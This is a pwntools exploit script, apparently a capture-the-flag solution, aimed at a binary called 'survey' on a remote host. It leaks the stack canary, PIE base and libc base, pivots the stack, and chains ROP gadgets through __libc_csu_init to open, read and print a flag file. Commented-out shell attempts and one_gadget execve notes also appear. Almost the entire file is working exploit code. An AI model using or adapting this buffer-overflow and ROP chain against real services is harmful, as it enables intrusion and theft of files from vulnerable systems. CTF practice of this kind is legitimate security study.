from pwn import *
import time

if args['LOCAL']:
    io = process(['./ld-2.29.so', './survey'], env = {'LD_PRELOAD': './libc.so.6'})
else:
    io = remote('140.112.31.97', 30201)

elf = ELF('./survey')
libc = ELF('./libc.so.6')

io.recvuntil('What is your name : ')
io.sendline('A' * 0x18)
io.recvuntil('A' * 0x18 + '\n')
canary = b'\0' + io.recv(0x7)
old_rbp = io.recv(6) + b'\0\0'

elf_base = u64(old_rbp) - 0x12f0

log.info('canary = ' + hex(u64(canary)))
log.info('PIE base = ' + hex(elf_base))

new_rbp = elf_base + 0x4c20
main_addr = elf_base + 0x1235
main_addr_short = elf_base + 0x1292

io.recvuntil('Leave your message here : ')
payload = b'A' * 0x18 + canary + p64(new_rbp) + p64(main_addr_short)
io.send(payload)

new_rbp += 0x200
payload = b'A' * 0x18 + canary + p64(new_rbp) + p64(main_addr_short)
io.send(payload)

new_rbp = elf_base + 0x4b38
payload = b'A' * 0x18 + canary + p64(new_rbp) + p64(main_addr)
io.send(payload)
#new_rbp = elf_base + 0x4e68
#payload = p64(0) * 3 + canary + p64(new_rbp) + p64(main_addr)
#io.send(payload)

io.recvuntil('What is your name : ')
io.send(b'A' * 0x30)
io.recvuntil('A' * 0x30)
libc_leak = u64(io.recv(6) + b'\0\0')
log.info('libc leak = ' + hex(libc_leak))
libc.address = libc_leak - 0x628d8
log.info('libc base = ' + hex(libc.address))
io.recvuntil('Leave your message here : ')

if args['GDB']:
    gdb.attach(io, '''
    ''')

fake_rbp = elf_base + 0x4800
payload = p64(0x42) * 3 + canary + p64(fake_rbp) + p64(main_addr_short)
io.send(payload)

fake_rbp += 0x28
payload = p64(libc.sym['read']) * 3 + canary + p64(fake_rbp) + p64(main_addr_short)
log.info(hex(libc.sym['read']))
io.send(payload)

syscall = libc.address + 0x26bd4
pop_rdx = libc.address + 0x12bda6
xor_rax_rax = libc.address + 0xb0355

# return to __libc_csu_init

libc_csu_init_pop = elf_base + 0x134a
libc_csu_init_pop_2 = elf_base + 0x134c
libc_csu_init_call = elf_base + 0x1330
libc_csu_init_call_2 = elf_base + 0x1339

r12 = 0
r13 = elf_base + 0x4830
r14 = 0x1000
r15 = elf_base + 0x47f0
#payload = p64(0x41) + p64(0x42) + p64(0x43) + p64(0x44) + p64(0x45) + p64(0x46)
payload = p64(libc_csu_init_pop_2) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(libc_csu_init_call)
io.send(payload)
time.sleep(1)

flag_path = b'/home/survey/flag'
rbx = 0 
rbp = 1
r12 = 0
r13 = elf_base + 0x47f0
r14 = 0x1000
r15 = elf_base + 0x47f0
payload = p64(libc_csu_init_pop) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(libc_csu_init_call)

io.send(payload)

# open
pop_rdi = libc.address + 0x26542
pop_rsi = libc.address + 0x26f9e
pop_rdx = libc.address + 0x12bda6
pop_r15 = libc.address + 0x26541
pop_rbx = libc.address + 0x314f9
pop_rbp = libc.address + 0x253a6 
read_syscall_num = libc.address + 0xb0355
write_syscall_num = libc.address + 0xce4b0
open_syscall_num = libc.address + 0x587c2
syscall_ret = libc.address + 0xcf6c5

time.sleep(1)
payload = p64(libc.sym['read']) + p64(libc.sym['open']) + p64(libc.sym['write']) + flag_path.ljust(0x60, b'\0')
# open
rdi = elf_base + 0x4808
rsi = 0 # O_RDONLY
rdx = 0
payload += p64(pop_rdi) + p64(rdi) + p64(pop_rsi) + p64(rsi) + p64(pop_rdx) + p64(rdx) + p64(open_syscall_num) + p64(syscall_ret)
# read
rdi = 3
rsi = elf_base + 0x4808
rdx = 0x100
payload += p64(pop_rdi) + p64(rdi) + p64(pop_rsi) + p64(rsi) + p64(pop_rdx) + p64(rdx) + p64(read_syscall_num) + p64(syscall_ret)
# write
rdi = 1
rsi = elf_base + 0x4808
rdx = 0x100
payload += p64(pop_rdi) + p64(rdi) + p64(pop_rsi) + p64(rsi) + p64(pop_rdx) + p64(rdx) + p64(write_syscall_num) + p64(syscall_ret)

io.send(payload)
#log.info(hex(new_rbp))
#new_rbp = new_rbp + 0x30
#payload = p64(0) * 3 + canary + p64(new_rbp) + p64(main_addr_short)
#io.send(payload)

#leave_ret = elf_base + 0x12e1

#leave_ret = elf_base + 0x12e1
#payload = p64(0) * 3 + canary + p64(new_rbp) + p64(leave_ret)
#log.info(hex(new_rbp))
#if args['GDB']:
#    gdb.attach(io, '''
#    ''')
#io.send(payload)

'''
0xe237f execve("/bin/sh", rcx, [rbp-0x70])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe2383 execve("/bin/sh", rcx, rdx)
constraints:
  [rcx] == NULL || rcx == NULL
  [rdx] == NULL || rdx == NULL

0xe2386 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0x106ef8 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
#log.info(hex(new_rbp))
#log.info(hex(libc_leak))
#new_rbp = new_rbp + 0x30
#payload = p64(one_gadget) + p64(elf_base + 0x4020) #+ p64(libc_leak) + canary + p64(new_rbp) + p64(main_addr_short)
'''
#log.info(hex(leak))

shell_addr = new_rbp
log.info(hex(shell_addr))

new_rbp += 0x30
payload = b'/bin/sh\0' + b'A' * 0x10 + canary + p64(new_rbp) + p64(main_addr)
io.send(payload)
#pop_rdi = elf_base + 0x1353

#rop_chain = [p]

#new_rbp += 0x30
#payload = p64() + p64() + p64() + canary + p64(new_rbp) + p64(main_addr)
#io.send(payload)
#io.recvuntil('What is your name : ')

#io.send('A')
#io.recvuntil('Leave your message here : ')
'''

io.interactive()
